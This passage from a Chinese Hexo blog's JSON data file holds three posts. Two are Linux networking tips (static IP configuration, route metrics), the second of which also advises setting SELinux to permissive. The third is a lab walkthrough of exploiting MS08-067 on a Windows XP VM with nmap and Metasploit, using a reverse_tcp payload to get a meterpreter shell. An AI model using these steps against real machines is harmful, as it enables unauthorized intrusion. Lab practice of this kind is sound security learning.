更改完配置文件后，IP并不会马上改变。需要手动进行一下重启。个人总结出来的一些经验，命令执行的顺序建议都不要改变。\n\n```bash\nsystemctl restart NetworkManager\nnmcli c d ens160\nnmcli c up ens160\n```\n\n这样**3**条命令下来，旧IP再顽固，也会无奈变成配置文件中的IP。","source":"_posts/linux-tips.md","raw":"---\ntitle: Linux使用小tips\ndate: 2023-05-18 17:26:10\ncategories: 小玩意儿\ntags:\n  - Linux\n---\n\n### 常用的一些操作\n\n1. 永久修改SELINUX值。\n\n使用虚拟机进行一些服务的配置的时候，如果SELINX的值不调整为permissive，经常会出现一些稀奇古怪的错误，如果每次都开机设置```setenforce 0```就太麻烦了。所以直接编辑```/etc/selinux/config```文件，设置```SELINUX=permissive```，最后保存退出。\n\n2. 永久修改网卡的IP地址。\n\n在平常的服务器的配置时，总是会涉及到IP的变动，我个人使用最多的方法是直接修改配置文件。\n\n<!-- more -->\n\n网卡配置文件```/etc/sysconfig/network-scripts/ifcfg-ens160```。分成几点来说。\n\n* BOOTPROTO=none，可选值还有static、dhcp、auto。none和static功能一样，dhcp和auto功能一样。\n\n* ONBOOT=yes，设置开机网卡自启的，建议设置为*yes*，可选值还有*no*\n\n* 如果网卡一开始是使用动态获取的，改成手动后，就要通过编辑配置文件来进行IP的设置。只需要在文件的末尾加上\n\n```bash\nIPADDR=192.168.20.10    # *设置IP*\nGATEWAY=192.168.20.254    # *设置网关*\nPREFIX=24    # *设置子网掩码*\n```\n\n有的配置文件还可以看到\n\n```bash\nDNS1=8.8.8.8\nDNS2=114.144.144.114\n```\n\n但是我并不建议大家在这里设置DNS，一是根本不会起什么作用，因为使用DNS的还有另一个配置文件（```/etc/resolv.conf```），二就是它会和```/etc/resolv.conf```文件指定的DNS相互冲突。\n\n* 更改完配置文件后，IP并不会马上改变。需要手动进行一下重启。个人总结出来的一些经验，命令执行的顺序建议都不要改变。\n\n```bash\nsystemctl restart NetworkManager\nnmcli c d ens160\nnmcli c up ens160\n```\n\n这样**3**条命令下来，旧IP再顽固，也会无奈变成配置文件中的IP。","slug":"linux-tips","published":1,"updated":"2024-05-03T03:55:54.877Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5g2006w7zj33r4k2u21","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"常用的一些操作\"><a href=\"#常用的一些操作\" class=\"headerlink\" title=\"常用的一些操作\"></a>常用的一些操作</h3><ol>\n<li>永久修改SELINUX值。</li>\n</ol>\n<p>使用虚拟机进行一些服务的配置的时候，如果SELINX的值不调整为permissive，经常会出现一些稀奇古怪的错误，如果每次都开机设置<code>setenforce 0</code>就太麻烦了。所以直接编辑<code>/etc/selinux/config</code>文件，设置<code>SELINUX=permissive</code>，最后保存退出。</p>\n<ol start=\"2\">\n<li>永久修改网卡的IP地址。</li>\n</ol>\n<p>在平常的服务器的配置时，总是会涉及到IP的变动，我个人使用最多的方法是直接修改配置文件。</p>\n<span id=\"more\"></span>\n\n<p>网卡配置文件<code>/etc/sysconfig/network-scripts/ifcfg-ens160</code>。分成几点来说。</p>\n<ul>\n<li><p>BOOTPROTO&#x3D;none，可选值还有static、dhcp、auto。none和static功能一样，dhcp和auto功能一样。</p>\n</li>\n<li><p>ONBOOT&#x3D;yes，设置开机网卡自启的，建议设置为<em>yes</em>，可选值还有<em>no</em></p>\n</li>\n<li><p>如果网卡一开始是使用动态获取的，改成手动后，就要通过编辑配置文件来进行IP的设置。只需要在文件的末尾加上</p>\n</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">IPADDR=192.168.20.10    <span class=\"comment\"># *设置IP*</span></span><br><span class=\"line\">GATEWAY=192.168.20.254    <span class=\"comment\"># *设置网关*</span></span><br><span class=\"line\">PREFIX=24    <span class=\"comment\"># *设置子网掩码*</span></span><br></pre></td></tr></table></figure>\n\n<p>有的配置文件还可以看到</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DNS1=8.8.8.8</span><br><span class=\"line\">DNS2=114.144.144.114</span><br></pre></td></tr></table></figure>\n\n<p>但是我并不建议大家在这里设置DNS，一是根本不会起什么作用，因为使用DNS的还有另一个配置文件（<code>/etc/resolv.conf</code>），二就是它会和<code>/etc/resolv.conf</code>文件指定的DNS相互冲突。</p>\n<ul>\n<li>更改完配置文件后，IP并不会马上改变。需要手动进行一下重启。个人总结出来的一些经验，命令执行的顺序建议都不要改变。</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl restart NetworkManager</span><br><span class=\"line\">nmcli c d ens160</span><br><span class=\"line\">nmcli c up ens160</span><br></pre></td></tr></table></figure>\n\n<p>这样<strong>3</strong>条命令下来，旧IP再顽固，也会无奈变成配置文件中的IP。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"常用的一些操作\"><a href=\"#常用的一些操作\" class=\"headerlink\" title=\"常用的一些操作\"></a>常用的一些操作</h3><ol>\n<li>永久修改SELINUX值。</li>\n</ol>\n<p>使用虚拟机进行一些服务的配置的时候，如果SELINX的值不调整为permissive，经常会出现一些稀奇古怪的错误，如果每次都开机设置<code>setenforce 0</code>就太麻烦了。所以直接编辑<code>/etc/selinux/config</code>文件，设置<code>SELINUX=permissive</code>，最后保存退出。</p>\n<ol start=\"2\">\n<li>永久修改网卡的IP地址。</li>\n</ol>\n<p>在平常的服务器的配置时，总是会涉及到IP的变动，我个人使用最多的方法是直接修改配置文件。</p>","more":"<p>网卡配置文件<code>/etc/sysconfig/network-scripts/ifcfg-ens160</code>。分成几点来说。</p>\n<ul>\n<li><p>BOOTPROTO&#x3D;none，可选值还有static、dhcp、auto。none和static功能一样，dhcp和auto功能一样。</p>\n</li>\n<li><p>ONBOOT&#x3D;yes，设置开机网卡自启的，建议设置为<em>yes</em>，可选值还有<em>no</em></p>\n</li>\n<li><p>如果网卡一开始是使用动态获取的，改成手动后，就要通过编辑配置文件来进行IP的设置。只需要在文件的末尾加上</p>\n</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">IPADDR=192.168.20.10    <span class=\"comment\"># *设置IP*</span></span><br><span class=\"line\">GATEWAY=192.168.20.254    <span class=\"comment\"># *设置网关*</span></span><br><span class=\"line\">PREFIX=24    <span class=\"comment\"># *设置子网掩码*</span></span><br></pre></td></tr></table></figure>\n\n<p>有的配置文件还可以看到</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DNS1=8.8.8.8</span><br><span class=\"line\">DNS2=114.144.144.114</span><br></pre></td></tr></table></figure>\n\n<p>但是我并不建议大家在这里设置DNS，一是根本不会起什么作用，因为使用DNS的还有另一个配置文件（<code>/etc/resolv.conf</code>），二就是它会和<code>/etc/resolv.conf</code>文件指定的DNS相互冲突。</p>\n<ul>\n<li>更改完配置文件后，IP并不会马上改变。需要手动进行一下重启。个人总结出来的一些经验，命令执行的顺序建议都不要改变。</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl restart NetworkManager</span><br><span class=\"line\">nmcli c d ens160</span><br><span class=\"line\">nmcli c up ens160</span><br></pre></td></tr></table></figure>\n\n<p>这样<strong>3</strong>条命令下来，旧IP再顽固，也会无奈变成配置文件中的IP。</p>"},{"title":"Linux多网卡引起的网络不可达","date":"2023-07-13T00:03:50.000Z","_content":"\n### 现象描述\n\n这是我最经做项目遇到的一个怪现象，是这样的，我在虚拟机里装了两块网卡，第一块呢，我用来进行虚拟机之间业务的通信，所以就选择了“仅主机模式”，第二块网卡是用来连接网络yum源的，所以就是“NAT模式”。\n\n在我第二天继续做项目的时候，我发现我的虚拟机集体罢工，都不能正常的访问外网了，尝试`ping 8.8.8.8`也不可达。我查看第二块网卡的IP，查看与宿主机之间的连接，网段，网管都是没有问题的。我百思不得其解，我之后进行Google才了解到，这是和网卡的METRIC值有关系的。\n\n<!-- more -->\n\n### 问题分析\n\n“METRIC”是Linux网卡的一个参数，本意是“度量值”的意思，这个数值越大，代表这块网卡的优先级越低。而在CentOS Linux 系统中默认的“METRIC”值是按照添加的顺序进行编号的。我第一块是“仅主机模式”的网卡，默认的“METRIC”值是100，第二块后添加的“NAT模式”网卡“METRIC”是101。\n\n查看METRIC值可以用这两条命令，我个人更倾向第二条，因为显示效果很整齐：\n\n```bash\nip route\n```\n\n```bash\nroute -n\n```\n\n那么问题就找到了，当我去`ping 8.8.8.8`的时候，默认是从“METRIC”值小的网卡出去的流量，也就是仅主机的网卡，那么自然也就访问不到外网了。\n\n### 解决办法\n\n解决办法也比较简单，在一切皆文件的Linux系统中，修改的参数无非就是对配置文件的修改。在本例中我们修改网卡的配置文件`/etc/sysconfig/network-scripts/ifcfg-ens224`。只需要在里面加上一行`IPV4_ROUTE_METRIC=10`，加在哪一行无所谓，只要单词不要拼错；改成多少都无所谓，只要比另一张网卡的“METRIC”值小就OK。\n\n然后我们重启网络服务，再重新up网卡，然后再查看网卡的“METRIC”值，验证是否生效，如果一切顺利，那么现在再去`ping 8.8.8.8`应该会发现已经好使了。","source":"_posts/modify-METRIC.md","raw":"---\ntitle: Linux多网卡引起的网络不可达\ndate: 2023-07-13 08:03:50\ncategories: 技术\ntags:\n  - Linux\n---\n\n### 现象描述\n\n这是我最经做项目遇到的一个怪现象，是这样的，我在虚拟机里装了两块网卡，第一块呢，我用来进行虚拟机之间业务的通信，所以就选择了“仅主机模式”，第二块网卡是用来连接网络yum源的，所以就是“NAT模式”。\n\n在我第二天继续做项目的时候，我发现我的虚拟机集体罢工，都不能正常的访问外网了，尝试`ping 8.8.8.8`也不可达。我查看第二块网卡的IP，查看与宿主机之间的连接，网段，网管都是没有问题的。我百思不得其解，我之后进行Google才了解到，这是和网卡的METRIC值有关系的。\n\n<!-- more -->\n\n### 问题分析\n\n“METRIC”是Linux网卡的一个参数，本意是“度量值”的意思，这个数值越大，代表这块网卡的优先级越低。而在CentOS Linux 系统中默认的“METRIC”值是按照添加的顺序进行编号的。我第一块是“仅主机模式”的网卡，默认的“METRIC”值是100，第二块后添加的“NAT模式”网卡“METRIC”是101。\n\n查看METRIC值可以用这两条命令，我个人更倾向第二条，因为显示效果很整齐：\n\n```bash\nip route\n```\n\n```bash\nroute -n\n```\n\n那么问题就找到了，当我去`ping 8.8.8.8`的时候，默认是从“METRIC”值小的网卡出去的流量，也就是仅主机的网卡，那么自然也就访问不到外网了。\n\n### 解决办法\n\n解决办法也比较简单，在一切皆文件的Linux系统中，修改的参数无非就是对配置文件的修改。在本例中我们修改网卡的配置文件`/etc/sysconfig/network-scripts/ifcfg-ens224`。只需要在里面加上一行`IPV4_ROUTE_METRIC=10`，加在哪一行无所谓，只要单词不要拼错；改成多少都无所谓，只要比另一张网卡的“METRIC”值小就OK。\n\n然后我们重启网络服务，再重新up网卡，然后再查看网卡的“METRIC”值，验证是否生效，如果一切顺利，那么现在再去`ping 8.8.8.8`应该会发现已经好使了。","slug":"modify-METRIC","published":1,"updated":"2024-05-03T03:55:54.877Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5g3006z7zj3a5d08rou","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"现象描述\"><a href=\"#现象描述\" class=\"headerlink\" title=\"现象描述\"></a>现象描述</h3><p>这是我最经做项目遇到的一个怪现象，是这样的，我在虚拟机里装了两块网卡，第一块呢，我用来进行虚拟机之间业务的通信，所以就选择了“仅主机模式”，第二块网卡是用来连接网络yum源的，所以就是“NAT模式”。</p>\n<p>在我第二天继续做项目的时候，我发现我的虚拟机集体罢工，都不能正常的访问外网了，尝试<code>ping 8.8.8.8</code>也不可达。我查看第二块网卡的IP，查看与宿主机之间的连接，网段，网管都是没有问题的。我百思不得其解，我之后进行Google才了解到，这是和网卡的METRIC值有关系的。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"问题分析\"><a href=\"#问题分析\" class=\"headerlink\" title=\"问题分析\"></a>问题分析</h3><p>“METRIC”是Linux网卡的一个参数，本意是“度量值”的意思，这个数值越大，代表这块网卡的优先级越低。而在CentOS Linux 系统中默认的“METRIC”值是按照添加的顺序进行编号的。我第一块是“仅主机模式”的网卡，默认的“METRIC”值是100，第二块后添加的“NAT模式”网卡“METRIC”是101。</p>\n<p>查看METRIC值可以用这两条命令，我个人更倾向第二条，因为显示效果很整齐：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip route</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">route -n</span><br></pre></td></tr></table></figure>\n\n<p>那么问题就找到了，当我去<code>ping 8.8.8.8</code>的时候，默认是从“METRIC”值小的网卡出去的流量，也就是仅主机的网卡，那么自然也就访问不到外网了。</p>\n<h3 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><p>解决办法也比较简单，在一切皆文件的Linux系统中，修改的参数无非就是对配置文件的修改。在本例中我们修改网卡的配置文件<code>/etc/sysconfig/network-scripts/ifcfg-ens224</code>。只需要在里面加上一行<code>IPV4_ROUTE_METRIC=10</code>，加在哪一行无所谓，只要单词不要拼错；改成多少都无所谓，只要比另一张网卡的“METRIC”值小就OK。</p>\n<p>然后我们重启网络服务，再重新up网卡，然后再查看网卡的“METRIC”值，验证是否生效，如果一切顺利，那么现在再去<code>ping 8.8.8.8</code>应该会发现已经好使了。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"现象描述\"><a href=\"#现象描述\" class=\"headerlink\" title=\"现象描述\"></a>现象描述</h3><p>这是我最经做项目遇到的一个怪现象，是这样的，我在虚拟机里装了两块网卡，第一块呢，我用来进行虚拟机之间业务的通信，所以就选择了“仅主机模式”，第二块网卡是用来连接网络yum源的，所以就是“NAT模式”。</p>\n<p>在我第二天继续做项目的时候，我发现我的虚拟机集体罢工，都不能正常的访问外网了，尝试<code>ping 8.8.8.8</code>也不可达。我查看第二块网卡的IP，查看与宿主机之间的连接，网段，网管都是没有问题的。我百思不得其解，我之后进行Google才了解到，这是和网卡的METRIC值有关系的。</p>","more":"<h3 id=\"问题分析\"><a href=\"#问题分析\" class=\"headerlink\" title=\"问题分析\"></a>问题分析</h3><p>“METRIC”是Linux网卡的一个参数，本意是“度量值”的意思，这个数值越大，代表这块网卡的优先级越低。而在CentOS Linux 系统中默认的“METRIC”值是按照添加的顺序进行编号的。我第一块是“仅主机模式”的网卡，默认的“METRIC”值是100，第二块后添加的“NAT模式”网卡“METRIC”是101。</p>\n<p>查看METRIC值可以用这两条命令，我个人更倾向第二条，因为显示效果很整齐：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip route</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">route -n</span><br></pre></td></tr></table></figure>\n\n<p>那么问题就找到了，当我去<code>ping 8.8.8.8</code>的时候，默认是从“METRIC”值小的网卡出去的流量，也就是仅主机的网卡，那么自然也就访问不到外网了。</p>\n<h3 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><p>解决办法也比较简单，在一切皆文件的Linux系统中，修改的参数无非就是对配置文件的修改。在本例中我们修改网卡的配置文件<code>/etc/sysconfig/network-scripts/ifcfg-ens224</code>。只需要在里面加上一行<code>IPV4_ROUTE_METRIC=10</code>，加在哪一行无所谓，只要单词不要拼错；改成多少都无所谓，只要比另一张网卡的“METRIC”值小就OK。</p>\n<p>然后我们重启网络服务，再重新up网卡，然后再查看网卡的“METRIC”值，验证是否生效，如果一切顺利，那么现在再去<code>ping 8.8.8.8</code>应该会发现已经好使了。</p>"},{"title":"远程命令执行（ms08-067）（CVE-2008-4250）","date":"2023-04-23T14:48:43.000Z","_content":"\n### 准备工作\n\n攻击机：kali，差不多的版本都可以，我用的是Linux kali 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23) x86_64 GNU/Linux，可以使用命令```uname -a```查看。\n\n靶机：XP windows，下载链接，推荐使用电脑版的腾讯微云下载，这是目前我找到的最好用的ed2k的下载工具了。\n\n<!-- more -->\n\n```bash\ned2k://|file|sc_winxp_tablet_2005_CD1.iso|629227520|505B810E128351482AF8B83AC4D04FD2|/\n```\n\n### 域内扫描\n\n攻击第一步，先扫描网络内存活并可以利用的主机。\n\n```bash\nnmap -T4 -A -v -Pn 192.168.20.1/24\n```\n\n### 开始攻击\n\n1. 执行```msfconsole -q```。\n2. 搜索```ms08-067```。\n\n![开启工具](./ms08-067/1.png)\n\n3. 设置攻击前必要的参数。从上图看到，只有一个可用的模块。我们就使用这个模块。然后可以使用```show options```先查看都需要让我们设置哪些参数。\n\n![使用模块](./ms08-067/2.png)\n\n4. 设置参数。上图看到，我们需要设置```rhosts```（靶机IP）。\n\n![设置参数](./ms08-067/3.png)\n\n5. 然后设置payload reverse_tcp\n\n![设置参数](./ms08-067/4.png)\n\n6. 最后设置靶机的类型，在这我选择34。\n\n![设置参数](./ms08-067/5.png)\n\n7. 设置好就可以开始攻击了。\n\n![设置参数](./ms08-067/6.png)\n\n最后返回meterpreter，攻击成功。","source":"_posts/ms08-067.md","raw":"---\ntitle: 远程命令执行（ms08-067）（CVE-2008-4250）\ndate: 2023-04-23 22:48:43\ncategories: 技术\ntags:\n  - 网络安全\n---\n\n### 准备工作\n\n攻击机：kali，差不多的版本都可以，我用的是Linux kali 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23) x86_64 GNU/Linux，可以使用命令```uname -a```查看。\n\n靶机：XP windows，下载链接，推荐使用电脑版的腾讯微云下载，这是目前我找到的最好用的ed2k的下载工具了。\n\n<!-- more -->\n\n```bash\ned2k://|file|sc_winxp_tablet_2005_CD1.iso|629227520|505B810E128351482AF8B83AC4D04FD2|/\n```\n\n### 域内扫描\n\n攻击第一步，先扫描网络内存活并可以利用的主机。\n\n```bash\nnmap -T4 -A -v -Pn 192.168.20.1/24\n```\n\n### 开始攻击\n\n1. 执行```msfconsole -q```。\n2. 搜索```ms08-067```。\n\n![开启工具](./ms08-067/1.png)\n\n3. 设置攻击前必要的参数。从上图看到，只有一个可用的模块。我们就使用这个模块。然后可以使用```show options```先查看都需要让我们设置哪些参数。\n\n![使用模块](./ms08-067/2.png)\n\n4. 设置参数。上图看到，我们需要设置```rhosts```（靶机IP）。\n\n![设置参数](./ms08-067/3.png)\n\n5. 然后设置payload reverse_tcp\n\n![设置参数](./ms08-067/4.png)\n\n6. 最后设置靶机的类型，在这我选择34。\n\n![设置参数](./ms08-067/5.png)\n\n7. 设置好就可以开始攻击了。\n\n![设置参数](./ms08-067/6.png)\n\n最后返回meterpreter，攻击成功。","slug":"ms08-067","published":1,"updated":"2024-05-03T03:55:54.877Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5g400727zj352enbsxn","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h3><p>攻击机：kali，差不多的版本都可以，我用的是Linux kali 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23) x86_64 GNU&#x2F;Linux，可以使用命令<code>uname -a</code>查看。</p>\n<p>靶机：XP windows，下载链接，推荐使用电脑版的腾讯微云下载，这是目前我找到的最好用的ed2k的下载工具了。</p>\n<span id=\"more\"></span>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ed2k://|file|sc_winxp_tablet_2005_CD1.iso|629227520|505B810E128351482AF8B83AC4D04FD2|/</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"域内扫描\"><a href=\"#域内扫描\" class=\"headerlink\" title=\"域内扫描\"></a>域内扫描</h3><p>攻击第一步，先扫描网络内存活并可以利用的主机。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -T4 -A -v -Pn 192.168.20.1/24</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"开始攻击\"><a href=\"#开始攻击\" class=\"headerlink\" title=\"开始攻击\"></a>开始攻击</h3><ol>\n<li>执行<code>msfconsole -q</code>。</li>\n<li>搜索<code>ms08-067</code>。</li>\n</ol>\n<p><img src=\"/2023/04/23/ms08-067/1.png\" alt=\"开启工具\"></p>\n<ol start=\"3\">\n<li>设置攻击前必要的参数。从上图看到，只有一个可用的模块。我们就使用这个模块。然后可以使用<code>show options</code>先查看都需要让我们设置哪些参数。</li>\n</ol>\n<p><img src=\"/2023/04/23/ms08-067/2.png\" alt=\"使用模块\"></p>\n<ol start=\"4\">\n<li>设置参数。上图看到，我们需要设置<code>rhosts</code>（靶机IP）。</li>\n</ol>\n<p><img src=\"/2023/04/23/ms08-067/3.png\" alt=\"设置参数\"></p>\n<ol start=\"5\">\n<li>然后设置payload reverse_tcp</li>\n</ol>\n<p><img 